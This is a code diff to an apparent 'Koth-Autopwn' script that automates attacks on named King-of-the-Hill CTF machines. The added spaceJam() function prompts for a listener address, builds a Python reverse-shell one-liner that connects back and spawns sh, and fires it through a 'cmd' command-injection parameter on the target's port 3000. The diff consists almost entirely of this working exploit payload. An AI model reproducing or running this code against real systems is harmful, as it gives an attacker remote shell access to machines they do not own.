@@ -121,6 +121,16 @@ def Lion():
     os.system(command)
     print(command)
 
+
+def spaceJam():
+    global ip, sess
+    input("[*] Listen On Any Port And Press Enter")
+    LHOST = input("[*] Enter LHOST: ")
+    LPORT = int(input("[*] Enter Listening Port: "))
+    payload = f"""python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(({LHOST},{LPORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'"""
+    sess.get(f"http://{ip}:3000/?cmd={payload}")
+
+
 if __name__ == "__main__":
 
     parser = argparse.ArgumentParser(description='Koth-Autopwn', usage=usage)
@@ -130,7 +140,6 @@ if __name__ == "__main__":
 
     machineName = args.n
     ip = args.i
-
     if machineName.lower() == "tyler":
         Tyler()
     if machineName.lower() == "production":
@@ -143,8 +152,10 @@ if __name__ == "__main__":
         H1()
     if machineName.lower() == "fortune":
         Fortune()
-    if machineName == "lion":
+    if machineName.lower() == "lion":
         Lion()
+    if machineName.lower() == "spacejam":
+        spaceJam()
     else:
         print("[!] Invalid Machine Name")
         exit()
